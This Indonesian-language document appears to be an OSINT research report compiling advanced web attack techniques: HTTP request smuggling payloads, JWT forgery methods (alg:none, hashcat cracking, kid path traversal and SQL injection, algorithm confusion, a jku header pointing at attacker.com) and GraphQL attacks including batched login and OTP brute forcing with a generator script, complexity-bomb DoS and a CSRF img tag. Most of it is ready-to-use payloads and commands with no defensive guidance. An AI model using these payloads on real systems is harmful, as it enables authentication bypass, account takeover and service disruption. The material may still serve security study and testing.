# 🔬 Teknik Serangan Web Tingkat Lanjut (2024–2026)

**Sumber:** PortSwigger Research, HackTricks, GitHub Advisories, Black Hat/DEF CON Papers

---

## 1. HTTP REQUEST SMUGGLING

### Teknik Klasik: CL.TE & TE.CL

#### CL.TE (Content-Length trusted by frontend, Transfer-Encoding by backend)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

e
SMUGGLED_PREFIX
0

GET /admin HTTP/1.1
X-Ignore: x
```

#### TE.CL (Transfer-Encoding trusted by frontend, Content-Length by backend)
```http
POST / HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### Teknik Baru 2024–2025: HTTP/2 Downgrade

#### H2.CL Attack
Frontend (CDN) downgrade HTTP/2 → HTTP/1.1 ke backend. Inject header `Content-Length: 0` palsu:
```
:method POST
:path /
content-length: 0      ← injected

GET /admin HTTP/1.1
Host: target.com
```

#### H2.TE Attack
Inject `Transfer-Encoding: chunked` ke HTTP/2. Frontend propagate ke HTTP/1.1 downstream.

### Teknik Terbaru 2025: "Desync Endgame"

#### CL.0 Attack
Backend abaikan body untuk path statis:
```http
POST /static/resource.js HTTP/1.1
Content-Length: 34

GET /admin HTTP/1.1
Foo: bar
```

#### Browser-Powered Desync
Browser korban dijadikan vektor — craft halaman web berbahaya yang memicu desync saat browser mengirim request.

#### Double Desync
Stage 1: Modifikasi state koneksi backend via desync pertama.
Stage 2: Gunakan state yang sudah dimodifikasi untuk desync kedua yang lebih powerful.

### Tools
- **HTTP Request Smuggler v3.0** (Burp Suite Extension)
- **smuggler.py** (standalone Python)
- CVE-2024-1135 (Gunicorn), CVE-2025-32094 (CDN-level)
- Penelitian Desync Endgame 2025 menghasilkan **>$350,000 bug bounty**

---

## 2. JWT TOKEN FORGERY DAN BYPASS

### Teknik 1: `alg: none` Bypass
1. Decode JWT yang sah
2. Ganti header: `{"alg":"none","typ":"JWT"}`
3. Modifikasi payload: `{"sub":"admin","role":"administrator"}`
4. Hapus signature, pertahankan trailing dot:
   ```
   eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
   ```
5. Coba variasi: `None`, `NONE`, `NoNe`

### Teknik 2: Weak Secret Brute Force (HS256)
```bash
# Hashcat mode 16500 = JWT
hashcat -a 0 -m 16500 captured.jwt /usr/share/wordlists/rockyou.txt

# Common weak secrets: secret, password, key, changeme, jwt_secret
```

### Teknik 3: `kid` Parameter Injection

#### Path Traversal ke `/dev/null`
```json
{ "alg": "HS256", "kid": "../../../../../../dev/null" }
```
Sign dengan empty string (`""`) karena `/dev/null` return kosong.

#### SQL Injection via `kid`
```json
{ "alg": "HS256", "kid": "1' UNION SELECT 'attackersecret'-- -" }
```
Database return `attackersecret` → sign JWT dengan `attackersecret` → valid!

### Teknik 4: Algorithm Confusion (RS256 → HS256)
1. Ambil public key dari `/jwks.json` atau `/.well-known/openid-configuration`
2. Sign token dengan HS256 menggunakan **public key sebagai HMAC secret**:
```python
import jwt
forged = jwt.encode({"sub":"admin"}, pubkey_pem, algorithm="HS256")
```

#### JWKS URL Injection (`jku` header)
```json
{ "alg": "RS256", "jku": "https://attacker.com/evil_jwks.json" }
```

### Tools
- **jwt_tool** (ticarpi/jwt_tool) — swiss army knife JWT
- **hashcat** mode 16500
- CVE-2022-21449 (Java "Psychic Signatures" ECDSA bypass)

---

## 3. GRAPHQL INTROSPECTION EXPLOITATION & BATCHING ATTACK

### Teknik 1: Full Schema Dump via Introspection
```graphql
query { __schema { types { name fields { name type { name kind } } } } }
```
Tools: **InQL** (Burp Extension), **Altair GraphQL Client**

### Teknik 2: Bypass Introspection yang Dinonaktifkan
Server mengembalikan: `"Did you mean 'userEmail' instead of 'userMail'?"`

**Tool: Clairvoyance**
```bash
pip install clairvoyance
clairvoyance -u https://target.com/graphql -o schema.json
```

### Teknik 3: Batching Attack — OTP/Password Brute Force

#### Array-Based Batching (1 HTTP request = 1000 percobaan)
```json
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"}
]
```

#### Alias-Based Batching (6-digit OTP: hanya 2,000 requests untuk exhaust)
```graphql
mutation {
  a1: verifyOTP(code: "000000") { success token }
  a2: verifyOTP(code: "000001") { success token }
  a3: verifyOTP(code: "000002") { success token }
}
```

```python
def generate_otp_batch(start, end):
    queries = [f'a{i}: verifyOTP(code: "{str(i).zfill(6)}") {{ success token }}'
               for i in range(start, end)]
    return "mutation {\n  " + "\n  ".join(queries) + "\n}"
```

### Teknik 4: GraphQL DoS via Complexity Bomb
```graphql
{ user { friends { friends { friends { friends { id email } } } } } }
```
Tiap level multiply resolver calls secara eksponensial → server OOM/CPU exhausted.

### Teknik 5: Deprecated Field Discovery
```graphql
{ __type(name: "User") { fields(includeDeprecated: true) { name isDeprecated } } }
```

### Teknik 6: CSRF via GET Request
```html
<img src="https://target.com/graphql?query=mutation{deleteAccount(id:1){success}}">
```

### Tools
- **InQL v4.x** — schema dump, attack generation
- **Clairvoyance** — field suggestion bruteforce
- **GraphQL Voyager** — schema visualization

---

## 📊 Ringkasan Attack Surface

| Teknik | Severity | Reference |
|---|---|---|
| CL.TE / TE.CL Smuggling | Critical | CVE-2024-1135 |
| H2.CL / H2.TE Downgrade | Critical | CVE-2025-32094 |
| CL.0 / Browser Desync | Critical | Black Hat 2025 |
| JWT alg:none Bypass | High | — |
| JWT Weak Secret Crack | High | hashcat mode 16500 |
| JWT kid Path Traversal | High | — |
| JWT Algorithm Confusion | Critical | CVE-2022-21449 |
| GraphQL Batching OTP Bypass | High | OWASP API Top 10 |
| GraphQL Complexity DoS | High | — |

---

*Laporan OSINT Ouroboros Researcher — Project Omniscience Batch 2*
